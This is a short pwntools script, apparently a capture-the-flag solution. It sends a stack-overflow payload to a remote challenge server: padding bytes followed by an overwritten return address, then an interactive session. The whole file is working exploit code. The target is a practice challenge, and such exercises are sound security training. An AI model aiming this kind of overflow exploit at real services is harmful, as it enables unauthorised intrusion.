from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("121.37.132.113",10001)
# p=remote("node4.buuoj.cn",25541)
p=remote("pwn-e770a3cdb8.challenge.xctf.org.cn", 9999, ssl=True)

# p=process("./controller_pwn")

payload=0x30*b'A'+8*b'B'+p64(0x80a)
# # payload=b'233'
# p.sendafter(b'What\'s your name? \n',payload)

p.sendline(payload)
p.interactive()